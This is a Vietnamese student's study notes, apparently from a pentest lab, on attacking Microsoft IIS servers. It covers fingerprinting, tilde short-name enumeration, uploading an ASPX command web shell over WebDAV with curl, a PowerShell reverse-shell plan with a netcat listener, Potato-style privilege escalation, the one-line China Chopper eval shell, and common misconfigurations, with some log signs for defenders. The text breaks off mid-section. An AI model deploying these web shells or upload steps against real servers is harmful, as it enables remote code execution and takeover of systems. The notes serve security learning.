# 1 -tổng quan

keyword cần nắm
``` txt
IIS_Attack_Chain
├── Nen_tang_va_Muc_tieu
│   ├── IIS
│   ├── .NET_runtime_ASPX
│   ├── Active_Directory_AD
│   └── w3wp.exe
├── Trinh_sat_va_Duc_khoet
│   └── IIS_tilde_enumeration_8.3_short-name
├── Ky_thuat_tan_cong
│   ├── WebDAV
│   ├── PUT-MOVE_bypass
│   ├── Write_and_Script_Execute_permission
│   └── .NET_deserialization
├── Leo_thang_dac_quyen
│   ├── Application_Pool_identity
│   ├── SeImpersonatePrivilege
│   └── Potato-style_privilege_escalation
├── Loi_cau_hinh_Misconfigurations
│   ├── web.config_exposure
│   ├── trace.axd
│   └── Directory_listing
└── Thuc_te_Threat_Actors
    ├── Lazarus_Group
    ├── HAFNIUM
    └── Exchange_ProxyLogon
```
bài này dạy mày toàn bộ quy trình đục một con Windows Server chạy IIS từ A đến Z:
* Dò hàng: Soi phiên bản IIS và mò file/thư mục ẩn bằng mẹo tên rút gọn (Tilde enumeration).
* Khai thác: Tận dụng tính năng WebDAV cấu hình sơ hở để tải shell ASPX vào máy bằng kỹ thuật PUT-MOVE.
* Hiểu cách shell ASPX hoạt động và cách dọn đường leo quyền lên System (Potato exploits).
* Bới rác cấu hình: Khai thác mấy lỗi hớ hênh kinh điển không cần mã exploit (lộ web.config, trace.axd, lộ thư mục).
# 2 -IIS finger print
Bài này nó dạy mày giai đoạn **Trinh sát (Reconnaissance) và Dò đường (Fingerprinting)** trên IIS trước khi vác súng đi bắn. Tao đúc kết lại thành 4 phần cốt lõi, đọc lướt qua là hiểu bản chất ngay:

###  Nhìn version IIS để đoán hệ điều hành và CVE
Thằng IIS gắn chặt với phiên bản Windows Server. Nhìn thấy version IIS là mày đọc vị được con máy nạn nhân đang chạy Windows gì để tìm CVE phù hợp:

* IIS 6.0: Chạy trên Windows Server 2003. Đồ cổ lỗ sĩ hết hạn hỗ trợ (EOL). Thấy con này ở ngoài public thì 99% là ăn được lỗi Buffer Overflow huyền thoại (CVE-2017-7269) không có bản vá chính thức.
* IIS 7.0 / 7.5: Windows Server 2008 / 2008 R2 (EOL).
* IIS 8.0 / 8.5: Windows Server 2012 / 2012 R2 (EOL).
* IIS 10.0: Windows Server 2016, 2019, 2022. (Nó nhảy cóc từ 8.5 lên thẳng 10.0, không có bản 9.x).

> [!NOTE] 
> ok nhưng mà nhìn cái phiên bản này kiểu gì ?

###  Hai tầng kiến trúc của IIS mà dân pentest bắt buộc phải nhớ
![[Pasted image 20260819114824.png|489]]
* Tầng 1 - HTTP.sys (Tầng Kernel): Đây là d<u>river chạy ở mức sâu nhất của hệ điều hành</u>, <u>hứng toàn bộ gói tin HTTP trước khi chuyển cho IIS xử lý.</u> Nếu đục trúng lỗ hổng ở tầng này (ví dụ CVE-2022-21907), con server sẽ ăn ngay Màn hình xanh chết chóc (BSOD) sập cả máy, chứ không phải lỗi web 500 thông thường.
* Tầng 2 - Application Pools & w3wp.exe (Tầng User): Mỗi web app chạy độc lập trong một cái hộp gọi là *Application Pool*, thực thi bởi tiến trình `w3wp.exe`. Khi mày up được web shell ASPX lên, <u>shell của mày sẽ chạy dưới quyền của tài khoản này</u> (mặc định là `IIS APPPOOL\ten_pool` hoặc `NETWORK SERVICE`).

> [!NOTE] 
> -chưa hiểu rõ lắm ?
> ![[Pasted image 20260819121732.png]]
> -mỗi một web app service của server chạy bởi thằng w3wp.exe à? tài khoản này chính là tài khoản w3wp.exe à?
> ![[Pasted image 20260819122056.png]]
> -webshell ASPX là gì?
> ![[Pasted image 20260819122113.png]]

> Điểm chí mạng: Tài khoản này mặc định ôm cái cờ quyền `SeImpersonatePrivilege`. Có cờ này trong tay thì bước tiếp theo là vác mấy bài bùa Potato ra để leo thẳng lên trùm cuối `SYSTEM`.

###  Quy trình trinh sát bằng lệnh `curl`
Chỉ cần ngồi gõ `curl` là lột sạch đồ của server:
#### Bước A: Cào Banner lấy phiên bản
```bash
curl -I http://MACHINE_IP
```

* Nhìn dòng `Server:` để lấy version IIS (ví dụ `Microsoft-IIS/10.0`).
* Nhìn dòng `X-Powered-By: ASP.NET` và `X-AspNet-Version:` để biết công nghệ và phiên bản framework backend.

> [!NOTE] Title
>tương tự như các web framework, chỉ cần curl -I là có thể thấy được thông tin sever của IIS trong header

#### Bước B: Ngửi mùi WebDAV bằng HTTP method OPTIONS
*WebDAV* là tính năng cho phép <u>quản lý, tải và sửa file qua web. </u>Bật cái này bừa bãi là mở cửa cho hacker đẩy shell lên.

```bash
curl -X OPTIONS http://MACHINE_IP/webdav -sv 2>&1 | grep -E "Allow:|DAV:"

```

* Nếu kết quả lòi ra header `DAV: 1,2,3` và dòng `Allow:` có các lệnh ghi/sửa như `PUT, MOVE, DELETE, PROPFIND` -> WebDAV đang mở toang.

#### Bước C: Thử nghiệm đục file ASPX
Ném thử một file test tính toán đơn giản (`1+1`) lên bằng lệnh `PUT`:
```bash
curl -s -o /dev/null -w "PUT aspx: %{http_code}\n" -X PUT --data '<%@ Page Language=Jscript%><%Response.Write(1+1)%>' http://MACHINE_IP/webdav/test.aspx

```

* Nếu mã trả về là `201 Created`: Server cho phép tải file lên.
* Sau đó dùng `curl` đọc lại file đó (`GET /webdav/test.aspx`): Nếu server in ra kết quả số `2` (đã tính toán) thay vì in nguyên đoạn code thô -> Server cấp quyền thực thi script (Script Execute), sẵn sàng để nhét web shell xịn vào quẩy.

> [!NOTE] Title
> chưa hiểu đoạn này ntn? thứu nhất đoạn lệnh trên là sao? tại sao lại là test.aspx ?,  và chỉ tấn công được khi *WebDAV* bật à?
> ![[Pasted image 20260819124103.png]]
> ![[Pasted image 20260819124124.png]]
### 4. Dấu hiệu bất thường trong Log (Dành cho bên phòng thủ/soi log)
Khi soi log IIS, các dấu hiệu sau chỉ ra server đang bị sờ gáy:
* Xuất hiện các method lạ: `OPTIONS` kèm response WebDAV, hoặc các lệnh `PUT`, `MOVE`, `PROPFIND`.
* Đường dẫn URL có dấu ngã `~` (đang bị dò file ngắn 8.3) hoặc tự dưng lòi ra file đuôi `.aspx` ở các thư mục upload.
* Mã trạng thái HTTP nổ `201 Created` (vừa có đứa up file thành công qua HTTP PUT).

> [!NOTE] quy trình tấn công cơ bản 
> Tóm lại: Soi header ra IIS 10.0 -> Bắn OPTIONS thấy bật WebDAV ở `/webdav/` -> Chuẩn bị đòn tiếp theo là up shell ASPX rồi leo quyền Potato. Mày nắm chắc cái sườn này rồi vào lab thực hành đi!

# 3- IIS tidle Enumeration
bài này dạy một chiêu trinh sát cực hiểm mà không cần tới bất kỳ mã exploit nào: **Lợi dụng lỗi tên file ngắn (8.3 Short Filename / Tilde Enumeration)** để lột sạch các file và thư mục ẩn trên IIS.

Ngồi ngay ngắn tao thông não 4 mục cốt lõi:
**1. Nguồn cơn: Cơ chế tên file 8.3 thời đồ đá của Windows**
* Thằng Windows thừa hưởng từ thời MS-DOS một cơ chế: mỗi khi tạo file hay thư mục tên dài trên ổ đĩa NTFS, nó tự động đẻ thêm một cái tên rút gọn song song (gọi là 8.3 filename).
* Quy tắc rút gọn cực kỳ dễ đoán: Lấy 6 chữ cái đầu + ghép đuôi `~1` (hoặc `~2`, `~3` nếu bị trùng) + 3 chữ cái đầu của đuôi mở rộng.
* Ví dụ: `BackupFiles` biến thành `BACKUP~1`, `users_backup.xlsx` biến thành `USERS_~1.XLS`.

**2. Bản chất lỗ hổng: Tại sao lại dò được file ẩn?**
* Khi mày gửi một request có dấu ngã `~` lên IIS, server sẽ đem cái chuỗi đó đi so với bảng tên ngắn trong hệ điều hành.
* Điểm chí mạng: Nếu cái tên ngắn đó **CÓ TỒN TẠI**, con IIS sẽ trả về mã lỗi hoặc dung lượng phản hồi (response size) khác một tí so với khi cái tên đó **KHÔNG TỒN TẠI**.
* Dựa vào sự khác biệt tí hon này, hacker chỉ cần viết tool gửi request thử từng chữ cái một để ghép thành cái tên ngắn hoàn chỉnh. Mấy thư mục ẩn mà từ điển thông thường không đoán ra được thì đòn này quét ra sạch.
* Lỗi này tồn tại từ IIS 5.x đến tận IIS 10.0 (Windows Server 2022). Phía Microsoft không vá vì coi đây là cơ chế của Windows. Muốn chặn thì admin phải tự vào Registry tắt chức năng tạo tên 8.3.

**3. Thực hành quét bằng tool `iis_shortname_scan.py**`
* Mày nhảy vào thư mục tool và nã lệnh:
```bash
cd /opt/IIS_shortname_Scanner
python3 iis_shortname_scan.py http://MACHINE_IP/
```
* Con tool sẽ dò từ trái qua phải bằng ký tự đại diện `*` (wildcard). Nó thử `/b~1.*` -> `/ba~1.*` -> `/bac~1.*` -> cho tới khi ra `/backup~1` thì đánh dấu `[Done]`.
* Kết quả tóm được: Thư mục `/backup~1` (tức là trên server có một thư mục ẩn bắt đầu bằng 6 chữ cái `backup`).

> [!NOTE] Title
> Cái short path name giúp dễ bruteforce hơn
> nó ko giúp ra hẳn tên /backup mà nó giúp đoán được thư mục nào tên bắt đầu bằng back

**4. Khai thác và lụm đồ (Credential)**
* Con IIS không cho mày xem file trực tiếp qua đường dẫn có dấu ngã (`/backup~1`), nên mày phải đoán hoặc dùng wordlist để tìm tên gốc đầy đủ (ở đây là `/BackupFiles/`).
* Chọc vào xem: `curl http://MACHINE_IP/BackupFiles/` -> Thư mục này vừa ẩn lại vừa dính thêm lỗi Directory Listing, phơi ngay ra file `webdav_notes.txt`.
* Đọc nội dung:
```bash
curl http://MACHINE_IP/BackupFiles/webdav_notes.txt
```
* Kết quả: Thằng dev bất cẩn để quên file ghi chú chứa **Username** và **Password** của WebDAV vào đây.
Lấy được tài khoản mật khẩu này rồi thì cất kỹ vào túi, tí nữa sang task sau vác đi đăng nhập WebDAV để nhét webshell vào máy nó!

# 4-
Ở Task 2, mày gửi request PUT ẩn danh vào `/webdav/` bị nó vả cho cái mã 401 Unauthorized vì WebDAV trên Server 2019 bắt buộc phải có tài khoản. Sang Task 3, nhờ trò tilde scan mà mày móc được file `BackupFiles/webdav_notes.txt` chứa sẵn tài khoản: `webdav_user:P@ssw0rd!123`. Giờ là lúc vác đồ chơi ra đục thẳng vào WebDAV.

Khi một thư mục WebDAV vừa cho phép ghi (write) vừa bật quyền chạy script (script execution), mày chỉ việc ném file ASPX lên rồi gọi nó chạy là có ngay quyền thực thi code (RCE), không cần dùng tới mã exploit phức tạp nào cả.
*-> cái này là giới thiệu thôi , lý thuyết quá*
### 3 điều kiện sống còn để cắm shell thành công
<u>Cả 3 yếu tố này bắt buộc phải xảy ra cùng lúc:</u>
1. WebDAV được bật trên thư mục mục tiêu.
2. Có tài khoản hợp lệ với quyền Write (ghi file) trên thư mục đó.
3. Thư mục được cấp quyền Script Execute, để IIS chuyển request `.aspx` cho bộ xử lý ASP.NET biên dịch thay vì chỉ ném ra file chữ tĩnh.

Thiếu bất kỳ điều kiện nào trong 3 cái trên là kế hoạch tạch ngay.
### Chuẩn bị con shell ASPX
Lưu đoạn code bên dưới thành file `cmd.aspx` trên máy của mày. Con shell này sẽ hứng tham số `cmd` trên URL, gọi `cmd.exe` chạy lệnh và in kết quả ra màn hình:
*=> về cơ bản nó giống webshell, reverse shell nhưng gọn nhẹ hơn*
```aspx
<%@ Page Language="C#" %><% 
  string cmd = Request.QueryString["cmd"];
  if (!string.IsNullOrEmpty(cmd)) {
    var proc = new System.Diagnostics.Process();
    proc.StartInfo.FileName = "cmd.exe";
    proc.StartInfo.Arguments = "/c " + cmd;
    proc.StartInfo.UseShellExecute = false;
    proc.StartInfo.RedirectStandardOutput = true;
    proc.Start();
    Response.Write("<pre>" + proc.StandardOutput.ReadToEnd() + "</pre>");
  }%>

```
### Bắn con shell lên server
*IIS bảo vệ thư mục `/webdav/` bằng cơ chế Windows Authentication*. Khách vãng lai chỉ được đọc (GET), còn các thao tác ghi (PUT, DELETE, MOVE) bắt buộc phải có danh tính Windows hợp lệ. Cơ chế NTLM giúp xác thực danh tính mà không cần truyền mật khẩu dạng rõ (plaintext). *Cờ `--ntlm` trong lệnh curl sẽ kích hoạt quá trình bắt tay xác thực này.*

Dùng `curl` kèm xác thực NTLM để đẩy file thẳng vào thư mục WebDAV:
```bash
curl -v --ntlm -u 'webdav_user:P@ssw0rd!123' -T cmd.aspx http://10.49.150.179/webdav/cmd.aspx
```
Khi server nhả về mã **201 Created**, tức là con shell đã được ghi đè thành công lên ổ cứng server.
### Xác nhận quyền chạy lệnh
Gửi thử một lệnh kiểm tra danh tính thông qua URL:
```bash
curl "http://10.49.150.179/webdav/cmd.aspx?cmd=whoami"

```

Kết quả trả về:
```text
<pre>iis apppool\defaultapppool
</pre>

```

Con shell đang chạy ngon lành dưới quyền của worker process IIS. Nếu mày gặp phản hồi trắng trơn hoặc dính lỗi 500, nguyên nhân là do thư mục `/webdav/` chưa được bật quyền Script Execute (file thì up lên được nhưng IIS từ chối chuyển cho ASP.NET xử lý).
> [!NOTE] 
> Phần này chỉ là test cái webshell có thể làm gì nếu *webdav* được bật và nếu chức năng script execute được bật

# 5-
Con shell đã cắm thành công trên server rồi. Bước tiếp theo là tương tác với nó, hiểu cách nó cựa quậy bên trong tiến trình w3wp.exe và nâng cấp từ lệnh web phèn lên con reverse shell xịn sò để tương tác.

Bản chất của Web shell ASPX
Web shell ASPX thực chất chỉ là một file code .aspx bình thường trên server, nhận input do mày truyền vào rồi thực thi nó. Dưới con mắt của con IIS, nó chỉ là một trang web bình thường; còn với mày, nó là cái cửa hậu điều khiển từ xa.

Khi IIS nhận request gọi file cmd.aspx, nó ném file đó cho ASP.NET xử lý. Bộ xử lý sẽ biên dịch và chạy code bên trong tiến trình worker w3wp.exe. Đoạn code này sẽ chạy dưới quyền của tài khoản Application Pool. Mặc định trên IIS 7.5 trở lên là ApplicationPoolIdentity — quyền hạn trong hệ thống thì thấp, nhưng lại được khuyến mãi sẵn cờ SeImpersonatePrivilege để dọn đường leo quyền sau này.

Bước 1: Gõ lệnh qua Web shell
File cmd.aspx nằm trong thư mục /webdav/, mày chỉ việc truyền tham số cmd trên URL để ra lệnh:

curl "[http://10.49.150.179/webdav/cmd.aspx?cmd=whoami](http://10.49.150.179/webdav/cmd.aspx?cmd=whoami)"

Kết quả trả về iis apppool\defaultapppool. Điều này chứng minh shell đang chạy tốt và danh tính hiện tại là tài khoản app pool mặc định. Mày có thể test thêm vài lệnh như hostname, ipconfig, hoặc dir C:\ (lưu ý thay dấu cách bằng dấu + hoặc %20 trên URL).

Bước 2: Nâng cấp lên Reverse Shell tương tác
Gõ lệnh từng phát một qua web rất tù túng. Muốn quẩy mượt mà thì phải kéo một phiên reverse shell về máy của mày:

1. Bật netcat trên máy tấn công để lắng nghe ở cổng 443:
nc -lvnp 443
(Dùng cổng 443 vì tường lửa mạng doanh nghiệp hầu như không bao giờ chặn luồng HTTPS đi ra ngoài).
2. Bắn một đoạn script PowerShell một dòng (one-liner) qua web shell để nó gọi ngược về máy mày. Lệnh này sử dụng các cờ quan trọng:

* -NoP: Bỏ qua PowerShell profile.
* -NonI: Chạy ngầm, không hiện cửa sổ tương tác hỏi han.
* -W Hidden: Giấu cửa sổ PowerShell.
* -Exec Bypass: Vượt qua chính sách cấm chạy script (Execution Policy).

3. Dùng curl với tùy chọn --data-urlencode để ném toàn bộ đoạn payload PowerShell đó vào tham số cmd của file cmd.aspx. Khi con server chạy đoạn mã, bên netcat của mày sẽ bắt được một phiên làm việc PowerShell tương tác hoàn chỉnh.

Bước 3: Kiểm tra quyền trong Reverse Shell
Khi đã tóm được shell trên netcat, gõ ngay lệnh:
whoami /priv

Mày sẽ thấy danh sách các cờ đặc quyền của tài khoản, trong đó quan trọng nhất là dòng SeImpersonatePrivilege ở trạng thái Enabled.

Cái cờ *SeImpersonatePrivilege* này là mỏ vàng trong giai đoạn hậu khai thác (post-exploitation). Nó cho phép một tiến trình mạo danh bất kỳ tài khoản nào kết nối tới nó ở cấp độ token của Windows. *Mấy con tool leo quyền họ nhà khoai tây (như PrintSpoofer, JuicyPotato, GodPotato) hoạt động bằng cách lừa một tiến trình cấp SYSTEM kết nối vào một đường ống (named pipe) do mày kiểm soát, sau đó lợi dụng cờ SeImpersonatePrivilege để ăn cắp token SYSTEM đó.* Nhờ thế, mày nhảy thẳng từ tài khoản cùi bắp iis apppool\defaultapppool lên quyền tối cao SYSTEM.
> [!NOTE]
> Đọc chả hiểu cái gì


Mở rộng: Web shell China Chopper ngoài đời thực
Con shell cmd.aspx mày vừa viết thì chạy được nhưng lộ liễu quá. Ngoài đời, các nhóm hacker khét tiếng (như HAFNIUM trong vụ hack Exchange ProxyLogon năm 2021) *toàn dùng con shell siêu nhỏ tên là China Chopper*.

Điểm dị của China Chopper là phần code cắm trên server chỉ nặng đúng 73 byte, vỏn vẹn một dòng duy nhất:
<%@ Page Language="Jscript"%><%eval(Request.Item["chopper"],"unsafe");%>

Hacker sẽ dùng một phần mềm client riêng trên máy tính để gửi các payload đã mã hóa qua HTTP POST vào tham số chopper. <u>Bên phòng thủ đi săn con này chủ yếu bằng cách quét tìm các file aspx có dung lượng siêu nhỏ hoặc chứa chuỗi hàm eval( và execute(.</u>

# 6- IIS misconfiguration
Nãy giờ tao với mày toàn đục vào cái WebDAV được cố tình bật lên. Còn bài này gom lại 7 cái lỗi cấu hình sơ hở kinh điển nhất của IIS. Mấy lỗi này ngoài đời gặp hoài, pentester không thèm check mấy cái này mà cứ đòi vác súng to đi bắn là dễ bỏ lỡ mấy con finding kiếm tiền ngon lành nhất.

Tao tóm gọn 7 lỗi cấu hình phổ biến cho mày dễ nuốt:

1. Bật Directory Listing (Lộ danh sách thư mục)
Khi một thư mục không có file mặc định (như index.html hay default.aspx) mà admin lại bật tính năng Directory Browsing trong IIS Manager, server sẽ phơi bày toàn bộ danh sách file ra thay vì báo lỗi 403 Forbidden.
Tác hại: Mấy file sao lưu, cấu hình, mã nguồn hay user upload bị phơi sạch cho thiên hạ tải về mà không cần đăng nhập.
Cách check: Dùng curl đâm vào mấy thư mục kiểu `/uploads/`. Thấy nó nôn ra file đuôi .bak, .config, .log, .zip, .sql là trúng mánh.
2. Mở lệnh HTTP PUT và DELETE không cần xác thực
Nếu check OPTIONS ở thư mục gốc mà header Allow: lòi ra lệnh PUT hoặc DELETE mà không bắt đăng nhập gì cả, tức là server cho phép khách vãng lai tự do ném file hoặc xóa file. Nhiều thằng admin cấu hình ẩu bật WebDAV trên toàn bộ trang web thay vì chỉ bật ở một thư mục riêng.
3. Phơi file web.config ra ngoài
File web.config là quả tim của ứng dụng ASP.NET, chứa chuỗi kết nối Database, API key, mật khẩu SMTP và các key mã hóa.
Bình thường IIS sẽ tự động chặn các file .config và trả về lỗi 404. Nhưng nếu admin sơ suất xóa mất rule chặn hoặc cấu hình sai MIME mapping, mày chỉ cần gõ `curl http://target/web.config` là tải được cả file về. Nếu nhận về mã 200 kèm nội dung XML bắt đầu bằng thẻ `<configuration>` thì đây là lỗi nghiêm trọng mức cao.
4. Bật chế độ báo lỗi chi tiết (Verbose Error Messages)
Khi ứng dụng bị lỗi, nếu để ở chế độ debug thì nó sẽ phun ra toàn bộ .NET stack trace. Cái đống này làm lộ đường dẫn nội bộ máy chủ (kiểu `C:\inetpub\wwwroot\...`), phiên bản .NET, câu lệnh SQL bị lỗi, và đôi khi lộ luôn cả IP nội bộ.
Chuẩn bài: Trong web.config phải bật `<customErrors mode="On" />` để giấu vết và chỉ hiện trang báo lỗi chung chung.
Lưu ý: Mặc định ASP.NET để chế độ `RemoteOnly` (chỉ hiện lỗi chi tiết khi mở trực tiếp trên máy chủ localhost, người ngoài truy cập thì giấu). Chỉ khi nào admin cố tình set `mode="Off"` thì người ngoài mới thấy được stack trace.
5. Bỏ quên trang chẩn đoán trace.axd
ASP.NET có sẵn một cái trang nhật ký chẩn đoán tên là trace.axd. Nếu bật lên, truy cập vào `http://target/trace.axd` sẽ xem được lịch sử 50 request gần nhất mà server đã nhận (cấu hình mặc định `requestLimit="50"`).
Tác hại: Trang này ghi lại toàn bộ header, dữ liệu người dùng nhập trong form, session cookie và token xác thực. Hacker chui vào đây lụm session cookie rồi gửi lại để cướp phiên đăng nhập của nạn nhân một cách ngọt xớt.
Chuẩn bài: Phải tắt bằng cách set `<trace enabled="false"/>` trong web.config.
6. Bật method HTTP TRACE
Method TRACE sinh ra để kiểm tra mạng bằng cách dội ngược lại y nguyên request mà client gửi lên. Trên môi trường thực tế, nó không có tác dụng gì ngoài việc mở đường cho đòn tấn công Cross-Site Tracing (XST) để trộm cookie.
Cách check: Bắn lệnh `curl -X TRACE http://target -sv`. Nếu nó trả về mã 200 kèm nội dung request thì tức là đang bật. Đúng chuẩn là server phải trả về mã 405 Method Not Allowed.
Dù các trình duyệt đời mới đã chặn TRACE trong JavaScript, nhưng khi đi pentest mày vẫn phải ném cái này vào báo cáo như một lỗi cấu hình lỏng lẻo.
7. Cấu hình AppPool chạy bằng tài khoản đặc quyền cao
Mặc định tài khoản chạy AppPool (ApplicationPoolIdentity) là tài khoản quyền thấp. Nhưng nhiều ông admin sợ dính lỗi phân quyền file hay database nên lười biếng set luôn cho AppPool chạy bằng quyền SYSTEM, Administrator, hoặc Domain Admin.
Nếu mày đã cắm được con shell ASPX ở bài trước, gõ `whoami` mà thấy nôn ra `nt authority\system` hoặc tài khoản Domain Admin luôn thì chúc mừng, mày đã húp trọn con server mà không cần phải nhọc công leo quyền Potato làm gì nữa.

# 7-automation
Mấy bài trước mày phải gõ `curl` còng cả lưng để soi từng cái header, mò WebDAV rồi bới cơ chế xác thực. Bài này nó dạy mày dùng **Nmap Scripting Engine** (NSE) để tự động hóa toàn bộ đống đó trong đúng một lượt quét.

4 script NSE cốt lõi cho IIS:
* `http-methods`: Tự động bắn request `OPTIONS` để lột sạch danh sách method được phép chạy (như PUT, DELETE, MOVE...).
* `http-webdav-scan`: Bắn request `PROPFIND` để kiểm tra xem WebDAV có bật không và đọc các header `DAV:`.
* `http-ntlm-info`: Gửi yêu cầu xác thực NTLM rồi <u>bóc tách thông tin nhạy cảm từ gói tin phản hồi </u>(lấy được cả tên máy chủ nội bộ NetBIOS, tên miền domain, và build version Windows).
* `http-iis-webdav-vuln`: <u>Check lỗ hổng</u> bypass xác thực WebDAV đời cổ (CVE-2009-1535 trên IIS 5/6).

> [!NOTE] Title
> không cần học đoạn này quá kỹ, ko cần nhớ quá rõ câu lệnh ntn, quan trọng là nhớ nó có những vai trò,chức năng là gì?. Khi dùng thì tra lại hoặc bảo AI nó viết luôn cho

Quy trình quét thực tế bằng Nmap:
1. Quét phiên bản dịch vụ:
```bash
nmap -sV -p 80 10.49.150.179
```
Nó nhả ra ngay `Microsoft IIS httpd 10.0`, xác nhận luôn đây là IIS 10.0 chạy trên Windows.

2. Dò method bằng script `http-methods`:
```bash
nmap --script http-methods -p 80 10.49.150.179
```
Kết quả báo một loạt method nguy hiểm như `PROPFIND, DELETE, MOVE, PUT` ngay ở thư mục gốc `/`. Nghĩa là admin cấu hình ẩu, mở toang WebDAV trên toàn bộ web.

3. Bắt quả tang WebDAV bằng `http-webdav-scan`:
```bash
nmap --script http-webdav-scan -p 80 10.49.150.179
```

> [!NOTE] Title
> http-... đi sau cái --script,   mấy cái --script nó là "nmap script engine", nó là các module đi kèm để có thể chạy nmap

Dù nó báo `WebDAV type: Unknown` (do bản Nmap cũ chưa nhận diện được nhánh cụ thể), nhưng việc lòi ra cả đống method dị biệt như `MKCOL, PROPPATCH, LOCK` khẳng định 100% WebDAV đang mở và cho phép ghi file.

4. Lột sạch thông tin nội bộ bằng `http-ntlm-info`:
```bash
nmap --script http-ntlm-info --script-args http-ntlm-info.root=/webdav/ -p 80 10.49.150.179
```

Chỉ bằng một request ẩn danh chưa cần mật khẩu, script này đã móc được:
* Tên máy: `CHANGE-MY-HOSTN`
* Phiên bản OS: `Product_Version: 10.0.17763` (chính là Windows Server 2019).
Đáp án cho câu hỏi trong ảnh của mày:
